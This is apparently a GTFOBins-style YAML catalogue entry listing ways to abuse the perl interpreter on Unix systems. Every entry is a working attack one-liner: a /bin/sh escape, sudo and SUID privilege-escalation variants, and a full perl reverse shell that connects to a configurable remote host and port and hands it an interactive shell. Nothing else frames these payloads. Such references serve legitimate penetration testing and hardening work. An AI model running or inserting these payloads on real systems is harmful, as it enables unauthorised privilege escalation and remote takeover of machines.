---
functions:
  exec-interactive:
    - code: perl -e 'exec "/bin/sh";'
  sudo-enabled:
    - code: sudo perl -e 'exec "/bin/sh";'
  suid-enabled:
    - code: ./perl -e 'exec "/bin/sh";'
  reverse-shell:
    - code: |
        export RHOST=127.0.0.1 
        export RPORT=12346
        perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
---